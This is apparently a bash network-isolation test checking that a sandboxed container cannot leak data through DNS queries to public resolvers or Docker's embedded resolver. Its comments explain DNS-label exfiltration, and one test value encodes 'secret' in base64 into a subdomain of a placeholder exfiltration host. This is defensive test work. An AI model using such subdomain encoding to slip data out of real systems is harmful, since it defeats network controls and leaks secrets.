#!/usr/bin/env bash
# §9.4: no external DNS from a tenant, including on the egress
# network.
#
# 03-dns-covert.sh established that Docker's embedded resolver does not forward
# external names on an `internal: true` network. The egress network is NOT
# internal — that is what gives the proxy a route out — so the question has to
# be asked again there, and the answer has to come from netfilter rather than
# from the engine.
#
# Why it matters more than it looks: a container that can resolve arbitrary
# names has a covert channel regardless of what TCP is blocked. Data encoded in
# subdomain labels leaves in the query itself, and the reply is irrelevant. In
# the proxy model the container never resolves anything — it hands the hostname
# to the proxy in CONNECT and the proxy resolves it.
#
#   hack/in-vm.sh bash test/netprobe/12-dns-exfil.sh
. "$(dirname "$0")/lib.sh"
require_root; require_docker

EGRESS_NET="${EGRESS_NET:-v2p-egress}"
EXFIL_NAME="${EXFIL_NAME:-c2VjcmV0.exfil.example.com}"

trap np_cleanup EXIT

docker network inspect "$EGRESS_NET" >/dev/null 2>&1 ||
    np_skip "no $EGRESS_NET network; start the control plane first"

docker run -d --rm --name "${NP_PREFIX}-dns" --network "$EGRESS_NET" \
    alpine:3.20 sleep 300 >/dev/null

# Give the sidecar the SAME rule pair a granted tenant gets: one accept naming
# the proxy as its only destination, and a default deny for everything else
# (§9.4). Without them this container is not representative of anything — it is
# an unprotected host on a non-internal bridge, and of course it can reach a
# public resolver. The question this probe asks is whether a TENANT can.
DNS_IP="$(docker inspect -f \
  "{{(index .NetworkSettings.Networks \"$EGRESS_NET\").IPAddress}}" "${NP_PREFIX}-dns")"
PROXY_IP="$(docker inspect -f \
  "{{(index .NetworkSettings.Networks \"$EGRESS_NET\").IPAddress}}" citadel-squid 2>/dev/null || true)"
[ -n "$PROXY_IP" ] || np_skip "the egress proxy is not on $EGRESS_NET"

iptables -I DOCKER-USER 1 -s "$DNS_IP" \
    -m comment --comment "netprobe dns default-deny" -j DROP
iptables -I DOCKER-USER 1 -s "$DNS_IP" -d "$PROXY_IP" -p tcp --dport 3128 \
    -m comment --comment "netprobe dns grant=test" -j ACCEPT
note "sidecar $DNS_IP has a granted tenant's rules: proxy only, everything else denied"

# Direct queries to public resolvers: blocked by the unconditional denies plus
# the tenant default-deny, on both transports.
expect_err "UDP/53 to a public resolver is dropped" \
    run_in "${NP_PREFIX}-dns" nslookup "$EXFIL_NAME" 1.1.1.1
expect_err "TCP/53 to a public resolver is dropped" \
    run_in "${NP_PREFIX}-dns" nc -w 3 -z 1.1.1.1 53
expect_err "UDP/53 to a second public resolver is dropped" \
    run_in "${NP_PREFIX}-dns" nslookup "$EXFIL_NAME" 8.8.8.8

# Docker's embedded resolver on a NON-internal network WILL forward upstream —
# this is the difference from §4, and the reason the name is never resolved in
# the container in the first place. Record what it does either way: a change
# here on an engine upgrade is a finding, not a test failure.
if run_in "${NP_PREFIX}-dns" nslookup "$EXFIL_NAME" 127.0.0.11 >/dev/null 2>&1; then

    note "the embedded resolver DID answer for an external name on $EGRESS_NET"
    note "expected on a non-internal network: this is why the CONNECT model has the"
    note "PROXY resolve the hostname, and why a hook is never handed a resolver it"
    note "can encode data into. Do not relax anything here."

else

    note "the embedded resolver did not forward an external name on $EGRESS_NET"
fi

# Even a successful lookup buys nothing: the address it returns is unreachable.
expect_err "a resolved address is still unreachable without a grant" \
    run_in "${NP_PREFIX}-dns" nc -w 3 -z 93.184.215.14 443

np_summary
